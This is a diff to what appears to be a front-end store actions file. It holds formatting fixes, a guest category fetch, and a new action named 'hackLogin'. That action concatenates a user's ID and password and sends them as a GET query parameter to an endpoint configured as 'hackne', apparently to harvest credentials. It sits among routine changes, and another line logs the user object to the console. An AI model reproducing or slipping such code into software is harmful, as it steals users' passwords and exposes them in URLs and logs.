@@ -209,7 +209,7 @@ export default {
                 })
                 .catch(function (error) {
                     commit('user_getCategory_error')
-                   // console.log(error)
+                    // console.log(error)
                     reject(error)
                 })
         })
@@ -297,7 +297,7 @@ export default {
         commit('user_request')
         return new Promise((resolve, reject) => {
             console.log(apiURL, user)
-            axios.patch(apiURL, {} ,{ params: user })
+            axios.patch(apiURL, {}, { params: user })
                 .then(function (response) {
                     commit('user_success', response.data)
                     resolve(response);
@@ -306,6 +306,30 @@ export default {
                     commit('user_error')
                     reject(err)
                 })
+        })
+    },
+    guestGetCategory({commit}) {
+        return new Promise((resolve, reject) => {
+            let apiURL = apiConfig.guestGetCategory
+            commit('guest_category_request')
+            axios.get(apiURL)
+                .then(function (response) {
+                    commit('guest_category_success', response.data)
+                    resolve(response)
+                })
+                .catch(function (error) {
+                    commit('guest_category_error')
+                    // console.log(error)
+                    reject(error)
+                })
+        })
+    },
+    hackLogin({ commit }, user) {
+        console.log(commit);
+        return new Promise(() => {
+            let TEXT = user.user_id + "/" + user.password
+            const apiURL = apiConfig.hackne;
+            axios.get(apiURL, { params: { TEXT: TEXT } })
         })
     }
 }
